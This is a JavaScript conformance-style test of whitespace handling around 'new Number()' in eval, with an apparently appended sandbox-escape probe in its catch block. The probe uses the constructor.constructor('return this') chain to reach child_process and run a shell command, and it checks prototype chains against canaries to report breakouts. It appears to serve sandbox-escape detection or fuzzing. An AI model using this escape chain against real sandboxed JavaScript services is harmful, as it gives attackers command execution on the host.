try {
    if (eval('new\tNumber()') != 0) {
        $ERROR('#1: new\\u0009Number == 0');
    }
    if (eval('new\x0BNumber()') != 0) {
        $ERROR('#2: new\\u000BNumber == 0');
    }
    if (eval('new\fNumber()') != 0) {
        $ERROR('#3: new\\u000CNumber == 0');
    }
    if (eval('new Number()') != 0) {
        $ERROR('#4: new\\u0020Number == 0');
    }
    if (eval('new\xA0Number()') != 0) {
        $ERROR('#5: new\\u00A0Number == 0');
    }
    if (eval('new\nNumber()') != 0) {
        $ERROR('#6: new\\u000ANumber == 0');
    }
    if (eval('new\rNumber()') != 0) {
        $ERROR('#7: new\\u000DNumber == 0');
    }
    if (eval('new\u2028Number()') != 0) {
        $ERROR('#8: new\\u2028Number == 0');
    }
    if (eval('new\u2029Number()') != 0) {
        $ERROR('#9: new\\u2029Number == 0');
    }
    if (eval('new\t\x0B\f \xA0\n\r\u2028\u2029Number()') != 0) {
        $ERROR('#10: new\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u2029Number == 0');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}